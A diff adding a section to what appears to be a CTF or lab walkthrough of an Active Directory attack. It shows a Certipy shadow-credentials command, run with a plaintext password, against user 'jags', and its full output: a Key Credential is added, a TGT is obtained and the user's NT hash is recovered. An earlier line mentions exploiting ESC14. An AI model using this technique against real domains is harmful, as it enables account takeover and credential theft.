@@ -341,4 +341,37 @@ altSecurityIdentities: WRITE
 
 `altSecurityIdentities: WRITE` means i can exploit ESC14
 
-# Shadow Credentials lea
+# Shadow Credentials leads to user compromise of `jags`
+
+```python
+certipy-ad shadow auto -u xjr@casper.hsm -p 'fFvq52PzJpO98X8!' -account 'jags'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: CASPER.HSM.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'jags'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '41a526bd9975481694f23e02e964ad60'
+[*] Adding Key Credential with device ID '41a526bd9975481694f23e02e964ad60' to the Key Credentials for 'jags'
+[*] Successfully added Key Credential with device ID '41a526bd9975481694f23e02e964ad60' to the Key Credentials for 'jags'
+[*] Authenticating as 'jags' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'jags@casper.hsm'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'jags.ccache'
+[*] Wrote credential cache to 'jags.ccache'
+[*] Trying to retrieve NT hash for 'jags'
+[*] Restoring the old Key Credentials for 'jags'
+[*] Successfully restored the old Key Credentials for 'jags'
+[*] NT hash for 'jags': 68fc3adf1953f5e6851c0dd297562e08
+```
+
+Now i have this users NT hash
+
+```python
+
+```
